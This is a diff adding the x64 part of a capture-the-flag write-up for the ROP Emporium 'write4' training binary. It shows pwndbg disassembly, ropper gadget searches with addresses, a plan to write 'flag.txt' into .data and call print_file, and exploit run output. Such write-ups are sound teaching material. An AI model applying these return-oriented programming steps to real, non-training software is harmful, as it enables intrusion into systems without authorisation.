@@ -299,4 +299,82 @@ Running it works
 [*] Stopped process './write432' (pid 136934)
 ```
 
-Here's the solution for the x64 binary ................coming soon i when i come back from church today
+Here's the solution for the x64 binary 
+
+Doing the basic file check and the process is still 
+
+But if you check the usefulGadget given you will see that its not `mov qword ptr [edi], ebp` but rather ` mov  QWORD PTR [r14],r15`
+
+```
+└─$ gdb-pwndbg write4    
+Reading symbols from write4...
+(No debugging symbols found in write4)
+pwndbg: loaded 138 pwndbg commands and 43 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
+pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
+------- tip of the day (disable with set show-tips off) -------
+The set show-flags on setting will display CPU flags register in the regs context panel
+pwndbg> disass usefulGadgets
+Dump of assembler code for function usefulGadgets:
+   0x0000000000400628 <+0>:     mov    QWORD PTR [r14],r15
+   0x000000000040062b <+3>:     ret    
+   0x000000000040062c <+4>:     nop    DWORD PTR [rax+0x0]
+End of assembler dump.
+pwndbg> 
+```
+
+With that i'll just follow the same process as i did for the x86 binary
+
+```
+└─$ ropper -f write4  --search "pop r14"
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: pop r14
+
+[INFO] File: write4
+0x0000000000400690: pop r14; pop r15; ret; 
+```
+
+And lastly i can't just call the print_file function on the .data section
+
+I'll need to pass it as an argument since its a x64 binary
+
+The argument will be popped to the print_file using a pop rdi gadget
+
+```
+└─$ ropper -f write4  --search "pop rdi"
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: pop rdi
+
+[INFO] File: write4
+0x0000000000400693: pop rdi; ret; 
+
+```
+
+Cool our exploit is almost ready
+
+Since this is a x64 binary i can directly pass in `flag.txt` to the `.data` section instead of doing it twice as `flag & .txt`
+
+Here's my exploit script [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ropemporium/write/exploit64.py)
+
+Running it works
+
+```
+└─$ python3 exploit.py
+[+] Starting local process './write4': pid 18352
+[*] data address 0x601028
+[*] pop r14; pop r15 0x400690
+[*] mov dword ptr [r14], r15; 0x400628
+[*] print file function address 0x400510
+[+] ROPE{a_placeholder_64byte_flag!}
+[*] Stopped process './write4' (pid 18352)
+```
+
+And we're done
+
+<br> <br>
+[Back To Home](../../index.md)
+                                               
+                                               
